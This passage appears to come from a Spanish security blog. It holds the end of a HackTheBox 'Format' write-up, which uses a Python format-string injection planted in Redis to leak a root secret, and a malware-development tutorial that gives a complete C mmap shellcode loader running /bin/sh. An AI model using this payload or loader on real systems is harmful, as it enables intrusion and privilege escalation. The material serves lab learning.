<span class="n">group</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-c</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--check</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Check if specified license key is valid</span><span class="sh">'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">license_key</span><span class="sh">'</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="p">.</span><span class="nc">Redis</span><span class="p">(</span><span class="n">unix_socket_path</span><span class="o">=</span><span class="sh">'</span><span class="s">/var/run/redis/redis.sock</span><span class="sh">'</span><span class="p">)</span>

<span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/license/secret</span><span class="sh">"</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
<span class="n">secret_encoded</span> <span class="o">=</span> <span class="n">secret</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
<span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">microblogsalt123</span><span class="sh">'</span>
<span class="n">kdf</span> <span class="o">=</span> <span class="nc">PBKDF2HMAC</span><span class="p">(</span><span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="p">.</span><span class="nc">SHA256</span><span class="p">(),</span><span class="n">length</span><span class="o">=</span><span class="mi">32</span><span class="p">,</span><span class="n">salt</span><span class="o">=</span><span class="n">salt</span><span class="p">,</span><span class="n">iterations</span><span class="o">=</span><span class="mi">100000</span><span class="p">,</span><span class="n">backend</span><span class="o">=</span><span class="nf">default_backend</span><span class="p">())</span>
<span class="n">encryption_key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">kdf</span><span class="p">.</span><span class="nf">derive</span><span class="p">(</span><span class="n">secret_encoded</span><span class="p">))</span>

<span class="n">f</span> <span class="o">=</span> <span class="nc">Fernet</span><span class="p">(</span><span class="n">encryption_key</span><span class="p">)</span>
<span class="n">l</span> <span class="o">=</span> <span class="nc">License</span><span class="p">()</span>

<span class="c1">#provision
</span><span class="nf">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">):</span>
    <span class="n">user_profile</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">hgetall</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">user_profile</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">User does not exist. Please provide valid username.</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
    <span class="n">existing_keys</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/license/keys</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">all_keys</span> <span class="o">=</span> <span class="n">existing_keys</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">user_key</span> <span class="ow">in</span> <span class="n">all_keys</span><span class="p">:</span>
        <span class="nf">if</span><span class="p">(</span><span class="n">user_key</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">):</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">License key has already been provisioned for this user</span><span class="sh">"</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
            <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
    <span class="n">prefix</span> <span class="o">=</span> <span class="sh">"</span><span class="s">microblog</span><span class="sh">"</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">).</span><span class="nf">decode</span><span class="p">()</span>
    <span class="n">firstlast</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="sh">"</span><span class="s">first-name</span><span class="sh">"</span><span class="p">).</span><span class="nf">decode</span><span class="p">()</span> <span class="o">+</span> <span class="n">r</span><span class="p">.</span><span class="nf">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="sh">"</span><span class="s">last-name</span><span class="sh">"</span><span class="p">).</span><span class="nf">decode</span><span class="p">()</span>
    <span class="n">license_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="sh">"</span><span class="s">{license.license}</span><span class="sh">"</span> <span class="o">+</span> <span class="n">firstlast</span><span class="p">).</span><span class="nf">format</span><span class="p">(</span><span class="n">license</span><span class="o">=</span><span class="n">l</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Plaintext license key:</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">------------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">license_key</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
    <span class="n">license_key_encoded</span> <span class="o">=</span> <span class="n">license_key</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
    <span class="n">license_key_encrypted</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">encrypt</span><span class="p">(</span><span class="n">license_key_encoded</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Encrypted license key (distribute to customer):</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">------------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">license_key_encrypted</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/license/keys</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">license_keys_file</span><span class="p">:</span>
        <span class="n">license_keys_file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span> <span class="o">+</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span> <span class="o">+</span> <span class="n">license_key_encrypted</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>

<span class="c1">#deprovision
</span><span class="nf">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">deprovision</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">License key deprovisioning coming soon</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>

<span class="c1">#check
</span><span class="nf">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">license_key_decrypted</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">License key valid! Decrypted value:</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">------------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">license_key_decrypted</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">License key invalid</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
</code></pre></div></div>

<p>Podemos ver que recibe 3 argumentos:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">group</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-p</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--provision</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Provision license key for specified user</span><span class="sh">'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
<span class="n">group</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-d</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--deprovision</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Deprovision license key for specified user</span><span class="sh">'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">)</span>
<span class="n">group</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-c</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--check</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Check if specified license key is valid</span><span class="sh">'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">license_key</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<p>Y la parte interesante es esta al momento de generar la licencia para el usuario:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">license_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="sh">"</span><span class="s">{license.license}</span><span class="sh">"</span> <span class="o">+</span> <span class="n">firstlast</span><span class="p">).</span><span class="nf">format</span><span class="p">(</span><span class="n">license</span><span class="o">=</span><span class="n">l</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>prefix, username y firstlast son unas partes de la licencia que se generara</li>
  <li>Con {license.license} y license=1, se le esta diciendo que acceda a un atributo en especifico del objeto el cual es una instancia de la clase Licence, donde el atributo es la licencia, como se puede ver aca</li>
</ul>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">License</span><span class="p">():</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span>
        <span class="n">self</span><span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">40</span><span class="p">))</span>
        <span class="n">self</span><span class="p">.</span><span class="n">created</span> <span class="o">=</span> <span class="n">date</span><span class="p">.</span><span class="nf">today</span><span class="p">()</span>
</code></pre></div></div>

<ul>
  <li>El <code class="language-plaintext highlighter-rouge">format()</code> se esta utilizando para reemplazar el valor de la posición 1 en la cadena de <code class="language-plaintext highlighter-rouge">license</code>, con los valores que corresponde, es decir, el marcador de posición de <code class="language-plaintext highlighter-rouge">{license.license}</code> se reemplaza por el valor del atributo <code class="language-plaintext highlighter-rouge">license</code> de la clase <code class="language-plaintext highlighter-rouge">License</code>, el cual viene como argumento por CLI, el problema es que mediante <code class="language-plaintext highlighter-rouge">format()</code> podemos acceder directamente a las propiedades de un objeto para obtener su valor, como por ejemplo, podemos acceder a los de la clase <code class="language-plaintext highlighter-rouge">License</code>, sin embargo, el problema grave viene por que tambien podemos acceder directamenta a otros atributos fuera de la clase para recuperar el valor de cualquier otra variable o atributo que este en el programa, eso lo podemos hacer con <code class="language-plaintext highlighter-rouge">__init__</code> y <code class="language-plaintext highlighter-rouge">__globals__</code>, ahora, guiandome de <a href="https://podalirius.net/en/articles/python-format-string-vulnerabilities/">aca</a> explotaremos esta vulnerabilidad, usaremos redis otra vez: <code class="language-plaintext highlighter-rouge">redis-cli -s /var/run/redis/redis.sock</code></li>
</ul>

<p>Ahora dentro de redis, usaremos <code class="language-plaintext highlighter-rouge">HMSET</code> para establecer varios valores en una clave:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HMSET c4rta first-name "{license.__init__.__globals__[secret_encoded]}" last-name hola username c4rta
</code></pre></div></div>

<p>En este caso, estamos estableciendo first-name, last-name y username en la clave “c4rta” dentro de una estructura hash, y el valor que le asignamos a first-name es <code class="language-plaintext highlighter-rouge">{license.init.globals[secret_encoded]}</code> donde estamos llamando a <code class="language-plaintext highlighter-rouge">secret_encoded</code> el cual es una variable en el archivo que analizamos y el cual contiene la licencia, que vendria siendo la contraseña, como se ve aca:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/license/secret</span><span class="sh">"</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
<span class="n">secret_encoded</span> <span class="o">=</span> <span class="n">secret</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
</code></pre></div></div>
<p>Asi que ahora si llamamos al archivo con la licencia <code class="language-plaintext highlighter-rouge">c4rta</code> nos debe de mostrar la contraseña de root <code class="language-plaintext highlighter-rouge">sudo /usr/bin/license -p c4rta</code></p>

<p><img src="/assets/img/htb-format/20.png" alt="" /></p>

<p>Y ya esta: la contraseña de root es <code class="language-plaintext highlighter-rouge">unCR4ckaBL3Pa$$w0rd</code></p>

<p><img src="/assets/img/htb-format/21.png" alt="" /></p>

<p>Eso ha sido todo, gracias por leer ❤</p>

<p><img src="/assets/img/htb-format/waifu.gif" alt="" /></p>]]></content><author><name>c4rta</name></author><category term="HackTheBox" /><category term="LFI" /><category term="Python Format String" /><summary type="html"><![CDATA[Tenemos un LFI en el parametro ID, que nos permitira leer archivos de configuracion de un reverse proxy, donde aprovecharemos una configuracion incorrecta de un proxy mediante una expresion, que nos permitira modificar una propiedad mediante la interacción de un socket de redis para convertirnos en “Pro”, posteriormente nos aprovecharemos otra vez de LFI donde usaremos el parametro ID para incluir un archivo PHP, y el parametro TXT para RCE]]></summary></entry><entry><title type="html">Inyeccion de shellcodes usando la syscall mmap</title><link href="http://localhost:4000/maldev/2023/06/10/inyeccion-shellcodes-mmap.html" rel="alternate" type="text/html" title="Inyeccion de shellcodes usando la syscall mmap" /><published>2023-06-10T00:00:00-06:00</published><updated>2023-06-10T00:00:00-06:00</updated><id>http://localhost:4000/maldev/2023/06/10/inyeccion-shellcodes-mmap</id><content type="html" xml:base="http://localhost:4000/maldev/2023/06/10/inyeccion-shellcodes-mmap.html"><![CDATA[<p class="lead">Desarrollaremos un programa en C el cual inyectara una shellcode usando la syscall mmap()</p>

<h2 id="mmap">mmap</h2>

<p>mmap es una syscall y una funcion incorporada en el header <code class="language-plaintext highlighter-rouge">sys/mman.h</code> la cual permite asignar o mapear memoria dentro del espacio de direcciones virtuales de un proceso, mmap regresa un puntero void (void *), la estructura es:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="o">*</span><span class="nf">mmap</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prot</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">off_t</span> <span class="n">offset</span><span class="p">);</span>
</code></pre></div></div>

<ul>
  <li>
    <p><strong>void *addr</strong>: Es la direccion desde donde se va a asignar la memoria, esta direccion se la podemos asignar manualmente, o en todo caso de que le pogamos <code class="language-plaintext highlighter-rouge">NULL</code>, le estamos diciendo al kernel que asigne la memoria, regularmente  la asigna a direcciones cercanas pero mayores a <code class="language-plaintext highlighter-rouge">/proc/sys/vm/mmap_min_addr</code></p>
  </li>
  <li>
    <p><strong>size_t length</strong>: Es la longitud en bytes de la memoria que se va a asignar</p>
  </li>
  <li><strong>int prot</strong>: Se refiera a con que protecciones vamos a asignar la memoria, hay varias
    <ul>
      <li>PROT_EXEC: La memoria es ejecutable</li>
      <li>PROT_READ: La memoria tiene permisos de lectura</li>
      <li>PROT_WRIT: La memoria tiene permisos de escritura</li>
    </ul>
  </li>
  <li>
    <p><strong>int flags</strong>: Determina si las actualizaciones de la memoria, son visibles para otras asignaciones de memoria dentro de la misma region de la memoria, existe muchas flags, asi que puedes leer cada una de ellas <a href="https://man7.org/linux/man-pages/man2/mmap.2.html">aqui</a>.</p>
  </li>
  <li>
    <p><strong>int fd</strong>: Es el descriptor de archivos el cual sera asginado</p>
  </li>
  <li><strong>off_t offset</strong>: Es el desplazamiento desde donde se va a asignar la memoria</li>
</ul>

<p>Una vez sabiendo eso ya podemos comenzar a tirar codigo</p>

<h2 id="desarrollo-del-programa">Desarrollo del programa</h2>

<p>Primero debemos de empezar a declarar nuestra shellcode como una cadena de caracteres de esta manera:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span>
<span class="k">const</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><span class="s">"</span><span class="p">;</span>
</code></pre></div></div>
<p>La shellcode ejecutara un /bin/sh</p>

<p>Dentro de una funcion, empezare a declarar todo el codigo de la inyeccion, primero debemos sacar el tamaño en bytes de la shellcode, ya que es uno de los argumentos que recibe <strong>mmap</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">ejecutar_shellcode</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">tam_shellcode</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Observa que se le esta agregando un <code class="language-plaintext highlighter-rouge">- 1</code>, esto es para quitarle el byte nulo.</p>

<p>Despues haremos el llamado a <code class="language-plaintext highlighter-rouge">mmap</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">ejecutar_shellcode</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">tam_shellcode</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

    <span class="kt">void</span><span class="o">*</span> <span class="n">shellcode_mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="n">tam_shellcode</span><span class="p">,</span>
        <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span>
        <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
        <span class="mi">0</span>
    <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>La direccion donde se va a asignar la memoria es <code class="language-plaintext highlighter-rouge">NULL</code> para que el kernel la elija, el tamaño de la memoria a asignar es el tamaño de la shellcode, en las flag le decimos que la memoria se asigne con permisos de lectura, escritura, y ejecucion, con el <code class="language-plaintext highlighter-rouge">-1</code> le estamos diciendo al descriptor de archivos que no se requiere un archivo ya existente y que solo asigne memoria, y te podras dar cuenta de algo, estamos usando la flag <code class="language-plaintext highlighter-rouge">MAP_ANONYMOUS + MAP_PRIVATE</code>, con esas flags le estamos indicando que la asignacion sera simplemente un bloque de memoria en ceros (por eso mismo el offset es 0), la cual estara lista de usar, ademas de ser privada, es decir, estara excluida de otras asignaciones de memoria dentro de la misma region de memoria</p>

<p>Aqui dibuje un diagrama de la asgnacion de memoria con mmap tomando en cuenta el ejemplo</p>

<p><img src="/assets/img/mmap_injection/mmap.jpeg" alt="" /></p>

<p>Lo que se ve a la izquierda es la memoria virtual de un proceso (sin entrar tanto en detalle), te podras dar cuenta que la memoria de la shellcode se asigno dentro de una seccion que se llama <code class="language-plaintext highlighter-rouge">Memory Mapping</code>, en esta seccion se asigna memoria para las librerias compartidas y dinamicas, ademas de las asignaciones de <code class="language-plaintext highlighter-rouge">mmap</code>, pero ojo, para que una asignacion de <code class="language-plaintext highlighter-rouge">mmap</code> recida en esta seccion, debe de ir con la flag <code class="language-plaintext highlighter-rouge">MAP_ANONYMOUS</code>.</p>

<p>Resumidamente el diagrama seria algo asi:</p>

<ul>
  <li>Usamos <code class="language-plaintext highlighter-rouge">sizeof()</code> para obtener el tamaño de la shellcode y lo guardamos en <code class="language-plaintext highlighter-rouge">tam_shellcode</code></li>
  <li>Asignamos memoria con <code class="language-plaintext highlighter-rouge">mmap</code> donde el tamaño es lo que tiene <code class="language-plaintext highlighter-rouge">tam_shellcode</code> (22 bytes)</li>
  <li>Usamos <code class="language-plaintext highlighter-rouge">MAP_ANONYMOUS</code> para indicarle que la asignacion se haga dentro de la seccion <code class="language-plaintext highlighter-rouge">Memory Mapping</code>,</li>
</ul>

<p>una vez que asignamos memoria para la shellcode, debemos de copiar la shellcode en esa memoria, eso lo hacemos con <code class="language-plaintext highlighter-rouge">memcpy</code>, memcpy se usa para copiar cierta cantidad de bytes desde un origen a un destino.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">memcpy</span><span class="p">(</span><span class="n">shellcode_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">tam_shellcode</span><span class="p">);</span>
</code></pre></div></div>

<p>En nuestro ejemplo le estamos diciendo que copie 22 bytes (tam_shellcode) del origen (shellcode), hacia la memoria que asignamos (shellcode_mem), y con esta operacion, nuestra shellcode ya estara escrita en la memoria que asigamos con mmap.</p>

<p>Ahora debemos de invocar a la shellcode, para eso realizamos esto:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">shellcode_ptr</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode_mem</span><span class="p">;</span>
<span class="n">shellcode_ptr</span><span class="p">();</span>
</code></pre></div></div>

<p>Primero definimos <code class="language-plaintext highlighter-rouge">shellcode_ptr</code> como un puntero a una funcion, con el fin de asignar a <code class="language-plaintext highlighter-rouge">shellcode_ptr</code> la direccion de memora que contiene <code class="language-plaintext highlighter-rouge">shellcode_mem</code> ya que cabe recordar que <code class="language-plaintext highlighter-rouge">shellcode_mem</code> contiene la direccion de memoria desde donde se asigno la shellcode, que es un tipo void *</p>

<p>Despues con <code class="language-plaintext highlighter-rouge">void (*)()</code> le estamos diciendo que defina un puntero a una funcion que no recibe argumentos ni tampoco retorne nada, esto con el fin de que <code class="language-plaintext highlighter-rouge">shellcode_mem</code> sea interpretado como un puntero hacia esa funcion, entonces a travez de <code class="language-plaintext highlighter-rouge">shellcode_ptr</code> podemos mandar a llamar a <code class="language-plaintext highlighter-rouge">shellcode_mem</code>.</p>

<p>Asi que cuando se haga un llamado a <code class="language-plaintext highlighter-rouge">shellcode_ptr();</code>, ejecutara lo que esta almacenado en <code class="language-plaintext highlighter-rouge">shellcode_mem</code>, lo cual es la shellcode:D</p>

<p>Despues solo queda a mandar a llamar a la funcion <code class="language-plaintext highlighter-rouge">ejecutar_shellcode()</code> desde el main:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">ejecutar_shellcode</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Y el codigo completo queda asi:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span>
<span class="k">const</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><span class="s">"</span><span class="p">;</span> <span class="c1">//bin/sh</span>

<span class="kt">void</span> <span class="nf">ejecutar_shellcode</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">tam_shellcode</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

    <span class="kt">void</span><span class="o">*</span> <span class="n">shellcode_mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="n">tam_shellcode</span><span class="p">,</span>
        <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span>
        <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
        <span class="mi">0</span>
    <span class="p">);</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">shellcode_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">tam_shellcode</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"Tamaño de la shellcode: %zu bytes</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">tam_shellcode</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode asignada desde la direccion: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">shellcode_mem</span><span class="p">);</span>

        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">shellcode_ptr</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode_mem</span><span class="p">;</span>

        <span class="n">shellcode_ptr</span><span class="p">();</span>
<span class="p">}</span>

